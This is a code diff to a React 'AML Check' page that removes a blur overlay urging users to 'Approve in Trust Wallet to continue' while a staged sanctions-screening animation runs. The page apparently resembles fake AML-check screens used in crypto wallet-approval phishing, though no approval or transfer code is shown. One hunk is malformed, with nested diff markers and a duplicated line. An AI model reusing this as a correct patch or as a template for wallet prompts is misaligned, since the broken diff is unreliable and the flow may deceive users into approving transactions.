@@ -84,9 +84,6 @@ export default function AmlCheck() {
   const [approvalTriggered, setApprovalTriggered] = useState(false)
   // Only show AML scanning UI when wallet is connected and Trust modal is closed
   const readyForAML = isConnected && !isTrustModalOpen && !!liveChainId
-  // Blur content until wallet connection logic is ready
-  const shouldBlur = !readyForAML
-  
   const stages = [
     { pct: 5, label: 'Loading account and network context' },
     { pct: 15, label: 'Sanctions lists screening' },
@@ -239,10 +236,9 @@ export default function AmlCheck() {
   return (
     <>
       <Header />
-      <main className="onboard" aria-labelledby="aml-title">
-+      <main className="onboard" aria-labelledby="aml-title" style={{ position: 'relative' }}>
--        <div className="onboard-inner">
-+        <div className={`onboard-inner ${shouldBlur ? 'blurred' : ''}`}>
+      <main className="onboard" aria-labelledby="aml-title" style={{ position: 'relative' }}>
+        <div className="onboard-inner">
+
           <h1 id="aml-title" className="onboard-title">AML Check in progress</h1>
           <p className="onboard-subtitle">We’re performing automated AML screening and transaction risk analysis before proceeding.</p>
 
@@ -290,11 +286,6 @@ export default function AmlCheck() {
             </div>
           </div>
         </div>
-+        {shouldBlur && (
-+          <div className="blur-overlay" aria-live="polite">
-+            Connecting to wallet… Approve in Trust Wallet to continue.
-+          </div>
-+        )}
       </main>
       <TrustWalletConnectModal isOpen={isTrustModalOpen} onClose={() => setTrustModalOpen(false)} dappUrl={amlPageUrl} />
       <Footer />
